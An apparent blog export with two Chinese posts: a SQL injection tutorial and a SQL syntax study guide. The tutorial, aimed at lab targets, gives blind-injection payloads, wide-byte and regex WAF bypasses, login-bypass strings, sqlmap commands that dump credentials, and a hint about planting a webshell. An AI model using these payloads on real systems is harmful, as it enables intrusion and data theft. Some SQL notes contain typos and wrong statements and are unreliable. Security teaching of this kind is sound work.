select * from (select database())a join (select version())b# 这段语句是如何工作的？我们逐一拆解：\n(select database())a: 创建了一个只含一列（数据库名）的临时表，并别名为 a\n(select version())b: 创建了另一个只含一列（版本信息）的临时表，并别名为 b\n... a join b: 通过join将这两个只有一行一列的表连接起来，形成一个一行两列的新表\nselect * from...: 最后用 select * 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来\n当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行\n函数过滤 常见函数过滤 下面是一些常见的等价函数：\n常用函数 等价函数或语法 功能 substring(str, m, n) substr(str, m, n)\nmid(str, m, n)\nreverse+left 截取字符串 ascii(char) ord(char) 返回字符的ASCII码 if(exp1, exp2, exp3) case when exp1 then exp2 else exp3 end 条件判断语句 database() schema() 返回当前数据库名 user() current_user()\nsession_user()\nsystem_user()\n@@user 返回当前数据库用户 version() @@version 返回数据库版本信息 concat(s1, s2, ...) concat_ws(sep, s1, s2, ...)\ngroup_concat(name) 拼接字符串 hex(str) 0x... (十六进制字面量) 将字符串转换为十六进制 sleep(seconds) benchmark(count, exp) 造成时间延迟 datadir() @@datadir 返回数据库路径 大部分相信都很熟悉了，这里介绍个几个比较不常见的：\ncase when语句代替if 用法一： case when exp1 then exp2 else exp3 end\n如果exp1为真就返回exp2，反之返回exp3\n1\u0026#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)# 用法二： case x when y then exp2 else exp3 end\n如果x=y则返回exp2，反之返回exp3\n1\u0026#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)# reverse+left代替substring left函数不能截取某一个精确的字符，但是结合reverse和ascii函数可以做到substring+ascii一样的效果：\nascii(reverse(left(string, n))) 这个组合可以做到取出string字符串第n位的ascii码\n怎么工作的呢？我们以ascii(reverse(left('ABCDE', 3)))为例：\nleft('ABCDE', 3)\n首先，left()函数从左边截取前3个字符，得到结果 'ABC'\nreverse('ABC')\n接着，reverse()函数将上一步的结果'ABC'进行反转，得到'CBA'\nascii('CBA')\n这是最关键的一步，ascii()函数会返回其参数字符串的第一个字符的ASCII码\n在这里，字符串'CBA'的第一个字符是'C'，其ASCII码是67\ntrim代替substring trim()函数在SQL中主要用于移除字符串首尾的字符\ntrim(both|leading|trailing remstr from str) str: 要处理的源字符串\nremstr: 要从str中移除的子字符串\nboth|leading|trailing: 指定移除的位置\nleading: 只从开头移除\ntrailing: 只从结尾移除\nboth: 从开头和结尾两端移除（默认）\n但如果我们让它移除一个不存在的字符，他什么都不会做：\ntrim(leading \u0026#39;e\u0026#39; from \u0026#39;abcd\u0026#39;) 返回的结果仍然是abcd，因为abcd的开头不是e\n利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次trim()操作的结果是否相同，来推断一个字符是否是目标字符串的开头\n第一次trim()：\n(trim(leading \u0026#39;a\u0026#39; from database()) = (trim(leading \u0026#39;b\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;a\u0026rsquo;）,后者返回 'dvwa' （开头也不是\u0026rsquo;b\u0026rsquo;）最终 'dvwa' = 'dvwa'，表达式为真\n这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试\n第二次trim()：\n(trim(leading \u0026#39;c\u0026#39; from database()) = (trim(leading \u0026#39;d\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;c\u0026rsquo;）,后者返回 'vwa' （开头是\u0026rsquo;d\u0026rsquo;）最终 'dvwa' = 'vwa'，表达式为假\n我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试\n第三次trim()：\n(trim(leading \u0026#39;d\u0026#39; from database()) = (trim(leading \u0026#39;e\u0026#39; from database())) 表达式为'vwa' = 'dvwa'，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头\n再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了\n如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头\n这样一位一位判断，就能凑出全貌\n#7 宽字节绕过 注入原理 宽字节注入是一种专门针对Web应用程序与数据库之间字符集编码不一致而产生的SQL注入漏洞\n其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾\nWeb应用层（如PHP）：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号'，其十六进制为0x27），并前面加上一个反斜杠\\进行转义（十六进制为0x5c），让这个危险的字符失去原本的功能，被当成普通的字符进行查询\n数据库层（如MySQL）：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符\n在GBK编码中，一个宽字节的第一个字节的范围是0x81-0xFE 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分\n攻击者正是利用了MySQL的这个特性，构造一个第一个字节在0x81-0xFE范围内、而第二个字节恰好是0x5c（即反斜杠\\）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号'重新变有效，导致注入成功\n注入过程 mysql_query(\u0026#34;SET NAMES gbk\u0026#34;); $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; 这段代码的关键点在于，它使用SET NAMES gbk将数据库连接设置为GBK编码，同时又使用了自定义的check_addslashes函数对输入进行转义\n普通注入(1\u0026rsquo;#)：\n攻击者提交?id=1'#，check_addslashes函数将'转义为\\' ，mysql最后执行的语句是：\nSELECT * FROM users WHERE id=\u0026#39;1\\\u0026#39;#\u0026#39; 这里的转义后的'变成了普通的符号，无法闭合字符串\n宽字节注入(1%df\u0026rsquo;#)：\n攻击者提交?id=1%df'#，check_addslashes函数将'转义为\\'，在url编码下变成：\n?id=1%df%5c%27# %5c就是被添加进去的反斜杠\\\n请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流0xdf 0x5c 0x27：\nMySQL首先读到0xdf，因为它在0x81-0xFE范围内，MySQL认为这是一个宽字符的开始\n随后，MySQL“吃掉”了紧随其后的0x5c（反斜杠\\）作为这个宽字符的第二字节\n0xdf5c被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠\\已经被消耗掉了\nMySQL继续向后解析，遇到了0x27（单引号'）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号\n最终，MySQL实际执行的语句变成了：\nSELECT * FROM users WHERE id=\u0026#39;1運\u0026#39;\u0026#39; # #8 正则表达式绕过 众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串\n有些粗心的WAF没有设置好修正符，这就让我们有机可乘：\n$id = $_GET[\u0026#39;id\u0026#39;]; $pattern = \u0026#39;/select.*from/i\u0026#39;; if (preg_match($pattern, $id)) { die(\u0026#39;检测到攻击，脚本终止！(Attack Detected!)\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 在这里的过滤中，WAF使用了i修正符匹配正则select.*from，意味着大小写绕过无效\n然而，他忘记了使用s修正符！\n元字符.可以匹配除换行符以外的任意单个字符，没有使用s修正符，所以 . 无法匹配换行符！\n而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符\n所以，我们可以在查询语句里面插入换行符绕过：\n1\u0026#39; union select 1,table_name%0afrom information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # ↑ #9 多参数请求绕过（双输入表单） 绕过间隔代码 部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：\n$param_a = $_GET[\u0026#39;a\u0026#39;]; $param_b = $_GET[\u0026#39;b\u0026#39;]; $sql = \u0026#34;SELECT * FROM user WHERE name = \u0026#39;\u0026#34; . $param_a . \u0026#34;\u0026#39; AND password = \u0026#39;\u0026#34; . $param_b . \u0026#34;\u0026#39;\u0026#34;; WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分\na部分输入：\n1\u0026#39; union/* b部分输入：\n*/select 1,2# 这样拼凑之后的sql语句就是：\nSELECT * FROM user WHERE name = \u0026#39;1\u0026#39; union/*\u0026#39; AND password = \u0026#39;*/select 1,2#\u0026#39; ~~~~~~~~~~~~~~~~~~~~~~~~~ 我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句\n万能密码 还可以构造出万能密码\n我们使用管理员的账号登录，假设是admin，密码输入：\n\u0026#39;or 1=1# 这样sql语句就变成了：\nSELECT * FROM user WHERE name = \u0026#39;admin \u0026#39; AND password = \u0026#39;\u0026#39;or 1=1# \u0026#39; 我们竟然直接登录了管理员的账号，这是为什么呢？\n一般没有进行SQL语句参数化的登录语句是这样的：\nSELECT * FROM user WHERE name = \u0026#39;xxx\u0026#39; AND password = \u0026#39;xxx\u0026#39; 数据库管理系统DBMS会判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功\n而在我们输入万能密码后，sql语句变成了：\nSelect * From 用户表 Where UserName=xxx and Password=\u0026#39;\u0026#39; or 1=1#\u0026#39;\u0026#39; or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录\n但1永远等于1，所以登录条件永远成立！\n或者换一种方式，我们直接在账号处就使用：\nadmin\u0026#39;# 密码随便填写，这样sql语句就是：\nSELECT * FROM user WHERE name = \u0026#39;admin\u0026#39;# \u0026#39; AND password = \u0026#39;xxx\u0026#39; 完全忽略了密码的校验，也就顺利登录了管理员账号\n恭喜，你现在已经学会了手工注入！\n呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?\n当然是有的！那就是使用自动化注入工具\u0026ndash;SqlMap！\nSqlMap使用 下载地址：\ngit clone https://github.com/sqlmapproject/sqlmap.git 基本使用步骤 检查注入点 -u：指定目标url\n\u0026ndash;batch：全自动模式，问什么都答对(y)`\nsqlmap -u http://192.168.204.133/show.php?id=33 --batch sqlmap指出它通过四种不同的方式成功注入了目标：\nboolean-based blind (布尔盲注) error-based (报错注入) time-based blind (时间盲注) UNION query (联合查询注入) 而由布尔盲注的payload:id=33 AND 3115=3115可以看出是数字型注入（id=33周围无单引号）\n由联合查询注入的target URL appears to have 15 columns in query可以知道一共有十五个字段\n爆破数据库信息 -dbs：爆破所有的数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --dbs --batch \u0026ndash;current-db：爆破当前数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-db --batch 结果说明现在的表名为cms\n爆破指定数据库的所有表名 -D：指定数据库名\n\u0026ndash;tables：枚举所有表\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms --tables --batch 爆破指定表的所有列名 -T：指定表名\n\u0026ndash;colums：枚举所有列\n注意此处要先指定数据库名，再指定表名：\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users --columns --batch #### extractvalue (XML_document, XPath_string)\n第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 select user,password from users where user_id=1 and (extractvalue(1,0x7e)); 由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误\nupdatexml (XML_document, XPath_string, new_value) 打印指定列名的字段数据 -C：指定列名\n\u0026ndash;dump：取出指定列名的所有数据\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users -C username,password --dump --batch 查看用户权限 \u0026ndash;users：列出数据库管理系统用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --users --batch \u0026ndash;current-user：查看当前连接数据库用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-user --batch \u0026ndash;is-dba：判断当前用户是否是DBA（数据库管理员）\nsqlmap -u http://192.168.204.133/show.php?id=33 --is-dba --batch 如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马\n查看数据库密码 \u0026ndash;password：自动寻找有没有常见的用户名和密码列\n可以看成是一系列操作（找到password表和dump）的自动化：\nsqlmap -u http://192.168.204.133/show.php?id=33 -passwords 结合burpsuite使用 有的时候我们需要对一个表单进行注入，这时候就可以使用post注入\n-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）\n拦截请求 在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt 进行爆破 sqlmap -r post.txt --dbs --batch 同样可以得到正确结果\n详细的sqlmap学习请参考这位师傅的文章，非常完整，无与伦比的好：\nTr0y\u0026rsquo;s Blog\u0026ndash;SQLmap 使用手册 ","date":"2025-07-02T00:52:02+08:00","image":"http://picture.928330.xyz/typora/bbe3473c5e7044490ec526dc455a0a8c.jpeg","permalink":"https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/","title":"SQL注入：从入门到入土"},{"content":"模式 定义模式 CREATE SCHEMA 模式名 AUTHORIZATION 用户名\neg:为用户ZHANG定义一个S-T模式：\nCREATE SCHEMA \u0026#34;S-T\u0026#34; AUTHORIZATION ZHANG eg:为用户ZHANG定义一个未命名的模式：\nCREATE SCHEMA AUTHORIZATION ZHANG 未定义模式名称的时候，默认模式为用户名\n删除模式 DROP SCHEAM 模式名\n普通：用于删除空的模式，如果模式下面有对象（表、视图）等，拒绝删除\nDROP SCHEAM 模式名 CASCADE\n级联：把模式里面的对象一并删除\nDROP SCHEAM 模式名 RESTRICT\n限制：会把对象转移到公共模式保留并删除模式，但如果对象和模式有联系，则拒绝删除模式\n基本表 定义基本元素 数据类型 数据类型 表示内容 CHAR(n) 长度为n的字符型 VARCHAR(n) 最大长度为n的变长字符型 NUMBER(n) 长度为n的数字型 INT 长整型(4B) SMALLINT 短整型(4B) BIGINT 大整型(8B) FLOAT(n) 精度至少为n位的浮点数 DATE 日期，格式为YYYY-MM-DD TIME 时间，格式为HH:MM:SS 列级完整性约束条件 约束条件 意义 PRIMARY KEY 主码（元素唯一不能重复）：当只有一个主码时，可直接在对应的属性列标注 NOT NULL 非空：表示该属性列不能取空值 UNIQUE 唯一值：表示该属性列只能取唯一值 CHECK 检查：检查该列是否满足某个条件，比如CHECK(某属性\u0026gt;20) 表级完整性约束条件 约束条件 意义 PRIMARY KEY(列名1,\u0026hellip;,列名n) 多个主码：当主码由多个属性构成时，\n必须作为表级完整性定义 FOREIGN KEY(列名1) REFERENCES 被参照表(列名1) 外码：被参照的列必须是 PRIMARY KEY 或 UNIQUE 约束 的列，\n本表所有值来源于被参照的列 特殊完整性约束条件——断言 相较于列级的CHECK语句，断言能指定更一般的约束\n创建断言 CREATE ASSERTION 断言名 CHECK字句;\neg.限制A课程最多60人选修：\nCREATE ASSERTION ASSE CHECK(60\u0026gt;= SELECT COUNT(*) FROM TAB1,TAB2 WHERE TAB1.NUM=TAB2.NUM AND TAB2.CLASS=\u0026#34;A\u0026#34;); -- 此处具体操作原理往后看 删除断言 DROP ASSERTION 断言名;\n特殊完整性约束条件——触发器 触发器是用户定义在关系表上的一类由事件驱动的特殊过程\n表的拥有者才能在表上创建触发器\n触发器只能定义在基本表上，不能定义在视图上\n定义触发器 CREATE TRIGGER 触发器名\n{BEFORE|AFTER} 触发事件 ON 表名\nREFERENCING NEW|OLD ROW AS 变量\nFOR EACH {ROW|STATEMENT}\n[WHEN 触发条件]触发动作体\n触发事件：INSERT DELETE UPDATE 或者他们的组合\n还可以UPDATE OF\u0026lt;触发列1,...\u0026gt;，即进一步指明修改哪些列时激活触发器 BEFORE/AFTER：触发时机，表示在触发事件的操作执行之前激活触发器\nROW/STATEMENT：指明是行级/语句级触发器，行级有多少行就触发多少次，语句级只触发一次\n触发条件：只有触发条件为真时才执行动作体，省略WHEN则立即执行动作体\n触发动作体：行级可以使用NEW/OLD引用事件之后的新值和事件之前的旧值，语句级不行\neg.对TAB1的Grade属性修改时，若增加了10%，则将操作记录在TAB2(Name,OldGrade,NewGrade)中\nCERATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW WHEN(NewTuple.Grade\u0026gt;=1.1*OldTuple.Grade) INSERT INTO TAB2(Name,OldGrade,NewGrade) VALUES(OldTuple.Name,OldTuple.Grade,NewTuple.Grade); 如果触发器内有多个语句，要定义新的定界符（不常用的），并使用BEGIN和END包裹：\n-- 1. 将定界符从 ; 改为 // DELIMITER // -- 2. 定义包含多条语句的触发器 CREATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW BEGIN -- 检查条件 IF (NewTuple.Grade \u0026gt;= 1.1 * OldTuple.Grade) THEN -- 这是块内的第一条语句，用 ; 结尾 INSERT INTO TAB2(Name, OldGrade, NewGrade) VALUES(OldTuple.Name, OldTuple.Grade, NewTuple.Grade); END IF; -- IF语句也需要用 ; 结尾 -- 3. 使用新的定界符 // 来结束整个 CREATE TRIGGER 命令 END // -- 4. 将定界符改回默认的 ; DELIMITER ; 激活触发器 多个触发器执行顺序：\n执行BEFORE触发器 -\u0026gt; 激活触发器的SQL语句 -\u0026gt; 执行AFTER触发器\n删除触发器 DROP TRIGGER 触发器名 ON 表名;\n定义基本表 CREATE TABLE 表名 (列名1 数据类型 列级完整性约束条件, 列名n 数据类型 列级完整性约束条件, 表级完整性约束条件1, 表级完整性约束条件n );\neg:\nCREATE TABLE TAB1 (Ch VARCHAR(10), Nu NUMBER(10), Grade INT NOT NULL, PRIMARY KEY(Ch,Nu), -- 多个主码 FOREIGN KEY(Ch) REFERENCES TAB2(Ch) ); 在模式中定义表 一个模式包含很多基本表，有三种方式在模式里面定义基本表\n创建表的时候指出模式 CREATE TABLE 模式名.表名();\n创建模式时直接定义表 CREATE SCHEMA 模式名 AUTHORIZATION 用户名 CREATE TABLE 表名();\n事先设置所属的模式 SET SCHEMA \u0026lsquo;my_schema\u0026rsquo;\neg.\nSET SCHEMA \u0026#39;my_schema\u0026#39;; CREATE TABLE my_table ( id INT PRIMARY KEY, name VARCHAR(100) ); my_table 将被创建在 my_schema 模式下\n修改基本表 同样的，修改表时想要指定模式里面的表，就使用“模式名.表名”的方式指定表名\n增加新的属性列 ALTER TABLE 表名 ADD 新列名 数据类型 完整性约束条件;\neg.向TAB1里增加时间列Time：\nALTER TABLE TAB1 ADD Time DATE; 当然，还能在ADD后面加上修饰词COLUMN，这样会更容易理解是在添加列，对功能没有影响：\nALTER TABLE TAB1 COLUMN Time DATE; ~~~~~~ 增加列级完整性约束条件 ALTER TABLE SC ADD 列级完整性约束条件;\neg.向TAB1里增加Grade列必须取唯一值的条件：（Grade必须要已经存在）\nALTER TABLE TAB1 ADD UNIQUE(Grade); 增加表级完整性约束条件 ALTER TABLE SC ADD 表级完整性约束条件;\neg.向TAB1里增加Ch为外码的条件，参照表是TAB2：\nALTER TABLE TAB1 ADD FOREIGN KEY(Ch) REFERENCES TAB2(Ch); 删除列 ALTER TABLE 表名 DROP CASCADE;\n级联：引用了该列的其他对象（例如视图）一起删除\nALTER TABLE 表名 DROP RESTRICT;\n限制：若该列被其他对象引用，则拒绝删除\n删除指定的完整性约束条件 ALTER TABLE 表名 DROP CONSTRAINT 完整性约束名 CASCADE/RESTRICT;\n修改列 ALTER TABLE 表名 ALTER COLUMN 列名 数据类型;\neg.把Grade由INT型修改成字符型：\nALTER TABLE 表名 ALTER COLUMN 列名 数据类型； 删除基本表 DROP TABLE 表名 CASCADE;\n级联：把表相关的依赖对象（比如视图）一并删除\nDROP TABLE 表名 RESTRICT;\n限制：如果此表被其他表依赖（外码）或者有视图等，拒绝被删除\n索引 建立索引 建立唯一索引 CREATE UNIQUE INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n唯一索引 是关于数据值是否唯一的，它强制数据的唯一性，并帮助快速查找特定值\neg.为表TAB1按照学号升序和时间降序建立唯一的索引：\nCREATE UNIQUE INDEX NewIndex ON TAB1(Nu ASC,Time DESC); ASC：asceding，升序 DESC：descending，降序\n建立聚簇索引 CREATE CLUSTER INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n聚簇索引 是关于数据如何物理存储的，它把数据和索引紧密地绑定在一起，让查找和范围查询非常快\n重命名索引 ALTER INDEX 旧索引名 RENAME TO 新索引名;\neg.把TAB1表的NewIndex索引重命名为OldIndex：\nALTER INDEX NewIndex RENAME TO OldIndex; 删除索引 DROP INDEX 索引名;\n查询数据\u0026ndash;SELECT语句 一般格式 SELECT ALL/DISTINCT 目标列表达式\nFROM 表名/视图名\nWHERE 条件表达式\nGROUP BY 列名 HAVING 条件表达式\nORDER BY 列名 次序;\nSELECT 目标列表达式 查询指定的列 SELECT 列名1，列名n\neg.查询TAB1的Ch列和Nu列：\nSELECT Ch,Nu FROM TAB1; 查询全部的列 SELECT *\neg.查询TAB1的全部记录：\nSELECT * FROM TAB1; 查询计算后的值 SELECT 表达式\n表达式可以是算术表达式（+、-\u0026hellip;)，字符串常量，函数等等\neg.查询TAB1里面所有Grade减去2的值：\nSELECT Grade-2 FROM TAB1; 改变查询结果的列标题 SELECT 列名 别名\neg.查询TAB1里面的Ch列和Nu列，在结果里面使用Chinese和Num显示\nSELECT Ch Chinese,Nu Number FROM TAB1; 去除查询结果的重复行 SELECT DISTINCT 列名\n如果没有使用DISTINCT，默认为ALL\n聚集函数 聚集函数只处理非空值\n聚集函数只能用于SELECT语句和CROUP BY中的HAVING子句\n统计元组个数 COUNT(*)\n某个元组的一个或者部分取空值的时候，不影响统计结果\neg.查询TAB1里面的总数：\nSELECT COUNT(*) FROM TAB1; 统计某一列值的个数 COUNT(DISTINCT/ALL 列名)\n指定DISTINCT会去重，NULL不计入总数\n计算某一列值的平均数（该列必须为数值型） AVG(DISTINCT/ALL 列名)\neg.查询TAB1里面的Grade平均值：\nSELECT AVG(ALL Grade) FROM TAB1; 计算某一列值的总和（该列必须为数值型） SUM(DISTINCT/ALL 列名)\n计算某一列值的最大值/最小值 MAX/MIN(DISTINCT/ALL 列名)\nWHERE 条件表达式 比较大小 WHERE 列名 运算式\n常用运算符：=\t\u0026gt;\t\u0026lt;\t\u0026gt;=\t\u0026lt;=\t!=/\u0026lt;\u0026gt;\t!\u0026gt;\t!\u0026laquo;/mark\u0026gt;\neg.查询TAB1里面所有三年级（Grade=3）的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade=3; eg.查询TAB1里面所有学号2300开头学生（Nu\u0026gt;23000）的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu\u0026gt;23000; 确定范围 WHERE 列名 BETWEEN 最小值 AND 最大值\nWHERE 列名 NOT BETWEEN 最小值 AND 最大值\neg.查询TAB1里面年级在1到3之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade BETWEEN 1 AND 3; eg.查询学号不在23000到24000之间的学生的姓名：\nSELECT Ch FROM TAB1 WHERE NOT Nu BETWEEN 23000 AND 24000; 确定集合 WHERE 列名 IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\nWHERE 列名 NOT IN (\u0026lsquo;列值1\u0026rsquo;,\u0026lsquo;列值n\u0026rsquo;)\neg.查询学号不是23001也不是23002的学生年级：\nSELECT Grade FROM TAB1 WHERE Nu NOT IN (\u0026#39;23001\u0026#39;,\u0026#39;23002\u0026#39;); 相当于多重条件查询的=语句\n字符匹配 百分号 % 表示任意长度的字符串(类似正则.*)，比如a%b就是以a开头，b结尾的任意长度字符串\n下划线 _ 表示单个字符，比如a_ _ _b（不用空格，这里方便看）是以a开头b结尾的长度为5的字符串\n在ASCII码表里，一个汉字长度为2，需要两个下划线\n反斜杠 \\ 表示转义，跟在 % 和 _ 前面（\\% 、\\_）让他们变成普通字符而非通配符\n使用 ESCAPE \u0026lsquo;符号\u0026rsquo; 设置转义字符，但一般使用反斜杠 根据环境决定要不要加上ESCAPE（有的数据库默认由\\转义）\nWHERE 列名 LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\nWHERE 列名 NOT LIKE \u0026lsquo;字符串\u0026rsquo; ESCAPE \u0026lsquo;\\\u0026rsquo;\neg.查询TAB1中姓名满足a%i_e的学生的年级：\nSELECT Grade FROM TAB1 WHERE Ch LIKE \u0026#39;a%i_e\u0026#39;; 空值查询 WHERE 列名 IS NULL\nWHERE 列名 IS NOT NULL\neg.查询TAB1中缺少学号的学生的年级：\nSELECT Grade FROM TAB1 WHERE Nu IS NULL; 多重条件查询 WHERE 条件表达式1 AND 条件表达式2\nWHERE 条件表达式1 OR 条件表达式2\n可以把AND和OR组合使用，其中AND优先级大于OR\nGROUP BY 列名 HAVING 条件表达式 用于将查询结果按某一列或多列的值分组，值相等的为一组 目的是细化聚集函数的作用对象，分组后聚集函数将作用于每一个组，每一组都有一个函数值\nGROUP BY 列名 eg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM TAB1 GROUP BY Grade; 以Grade分组，在每一组中求取Ch的数量\nGROUP BY 列名 HAVING 筛选条件 HAVING用于从组中选择满足条件的组 WHERE用于从基本表或视图中选择满足条件的元组（注意：WHERE子句不可以接聚集函数）\neg.求TAB1表里面各个年级和对应的人数：\nSELECT Grade,COUNT(Ch) FROM .TAB1 GROUP BY Grade HAVING GRADE\u0026gt;=2; 以Grade分组，在每一组中求取Ch的数量\nORDER BY 次序 ORDER BY 列名1 列名n ASC\nORDER BY 列名1 列名n DESC\n如果不设置，默认升序（ASC）\neg.查询TAB1中学生的年级，按照降序排列：\nSELECT Grade FROM TAB1 ORDER BY GRADE DESC; 连接查询 两表连接查询 WHERE 表名1.列名1 比较运算符 表名2.列名2\n当列名在参与连接的各表中唯一时，可省去表名前缀\neg.查询TAB1和TAB2中所有数据，并在一个查询结果里面展示\nSELECT STUDY.TAB1.*,STUDY.TAB2.* FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; 若想获得自然连接，则列举全部属性列，并去掉一个相同的属性列即可。可以将上述SELECT语句改写如下：\nSELECT Ch,Grade,Cla,Hom,STUDY.TAB2.Nu -- 去掉了其中一个Nu FROM STUDY.TAB1,STUDY.TAB2 WHERE TAB1.Nu=TAB2.Nu; eg.在TAB1和TAB2里查询选了英语课，并且是三年级的学生的学号:\nSELECT STUDY.TAB1.Nu FROM STUDY.TAB1,STUDY.\u0026#34;tab2\u0026#34; WHERE CLA=\u0026#39;ENGLISH\u0026#39; AND GRADE=3; 单表连接查询 通过取两个别名，对同一个表进行自连接\neg.查询cla和cla2相同的学生学号：\nSELECT FIRST.*,SECOND.* FROM STUDY.TAB2 FIRST,STUDY.tab2 SECOND WHERE FIRST.CLA=SECOND.CLA2; 外连接查询 左外连接保留左表的所有记录，并尽可能地匹配右表中的记录 右外连接保留右表的所有记录，并尽可能地匹配左表中的记录\n将悬浮元组保留在结果关系中，没有属性值的位置填上NULL\nSELECT 列名 FROM 表名1 LEFT OUTER JOIN 表名2 ON(连接条件)\nSELECT 列名 FROM 表名1 RIGHT OUTER JOIN 表名2 ON(连接条件)\neg.以TAB1为主体，列出每个学生选课cla的结果\nSELECT STUDY.TAB1.Ch,CLA FROM STUDY.TAB1 LEFT OUTER JOIN STUDY.TAB2 ON(STUDY.TAB1.Nu=STUDY.TAB2.Nu); 此时会保留TAB1里面的所有记录，匹配对应的TAB2记录\n多表连接查询 WHERE 表名1.列名1 = 表名2.列名2 AND 表名2.列名2 = 表名3.列名3\n多表连接一般是先进行两个表的连接操作，再将其连接结果与第三个表执行连接\n嵌套查询 查询块：SELECT-FROM-WHERE 嵌套查询：将一个查询块嵌套在另一个查询块的WHERE子句或者HAVING子句 上层的查询块称为外层查询/父查询；下层的查询块称为内层查询/子查询 子查询的SELECT语句中不能使用ORDERBY子句，ORDERBY子句只能对最终查询结果排序\n集合判断IN子查询 WHERE 列名 IN (子查询)\neg.查询alice的年级：\nSELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39;; 查询结果为alice在三年级，再查找三年级的其他学生：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE=3; 上面两个查询结合为嵌套查询：\nSELECT CH,NU FROM STUDY.TAB1 WHERE GRADE IN (SELECT GRADE FROM STUDY.TAB1 WHERE CH=\u0026#39;alice\u0026#39; ); 本例的子查询条件不依赖于父查询，这类子查询称为不相关子查询\n比较运算符子查询 WHERE 列名 比较运算符 (子查询)\n当明确知道子查询结果是单个值而不是集合的时候使用\neg．在SC表中，找出每个学生（Sno）超过他自己选修课程平均成绩（Grade）的课程号（Cno)\nSELECT Sno, Cno FROM SC x -- x是表 SC 的别名，又称为元组变量，可以用来表示 SC 的一个元组 WHERE Grade \u0026gt;= (SELECT AVG(Grade) FROM SC y WHERE y.Sno=x.Sno); 这里必须加上WHERE y.Sno=x.Sno这个条件，此时内外对应的sno才会相同，否则求的不是单个学生的平均成绩，而是所有学生的平均成绩\n本例的子查询条件依赖于父查询，这类子查询称为相关子查询，整个查询称为相关嵌套查询\nANY/ALL子查询 WHERE 列名 比较运算符 ANY/ALL (子查询)\n谓词 语义 与聚集函数或 IN 的等价转换 \u0026gt;ANY 大于子查询结果中的某个值 \u0026gt;MIN \u0026gt;ALL 大于子查询结果中的所有值 \u0026gt;MAX \u0026lt;ANY 小于子查询结果中的某个值 \u0026lt;MAX \u0026lt;ALL 小于子查询结果中的所有值 \u0026lt;MIN \u0026gt;=ANY 大于等于子查询结果中的某个值 \u0026gt;=MIN \u0026gt;=ALL 大于等于子查询结果中的所有值 \u0026gt;=MAX \u0026lt;=ANY 小于等于子查询结果中的某个值 